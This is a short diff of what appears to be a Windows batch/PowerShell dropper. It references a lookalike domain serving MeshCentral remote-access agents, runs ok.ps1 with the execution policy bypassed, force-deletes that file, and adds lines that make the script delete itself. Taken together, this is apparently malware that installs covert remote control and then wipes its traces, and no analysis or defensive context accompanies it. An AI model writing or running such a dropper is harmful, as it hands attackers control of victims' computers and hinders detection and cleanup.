@@ -2,3 +2,6 @@ echo $Url = 'https://mesh.locallhost.cloud/meshagents?id=4^&meshid=3D1$8kzevTQqn
 
 powershell.exe -ExecutionPolicy Bypass -File ok.ps1
 powershell.exe -ExecutionPolicy Bypass -Command "Remove-Item -Path 'ok.ps1' -Force"
+$scriptPath = $MyInvocation.MyCommand.Path
+Remove-Item -Path $scriptPath -Force
+
